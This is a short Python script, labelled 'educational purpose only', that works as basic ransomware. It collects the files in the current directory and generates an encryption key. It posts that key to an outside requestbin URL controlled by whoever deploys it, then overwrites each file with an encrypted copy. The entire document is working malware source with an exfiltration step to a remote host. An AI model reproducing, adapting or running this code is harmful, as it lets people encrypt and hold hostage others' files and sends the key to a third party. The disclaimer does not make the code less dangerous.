# EDUCATIONAL PURPOSE ONLY


import os
import requests  # Ajout pour l'envoi de la requête HTTP
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file in ["install.py", "thekey.key", "demal.py", "InstallRB.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()



# Your requestbin URL
requestbin_url = "https://requestbin.com/r/proj_DasMr5m"

# Send the key to the requestbin
response = requests.post(requestbin_url, data=key)

# Check the response status code
if response.status_code == 200:
    print("Key sent successfully to requestbin.")
else:
    print("Failed to send key to requestbin.")

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("get crypted")

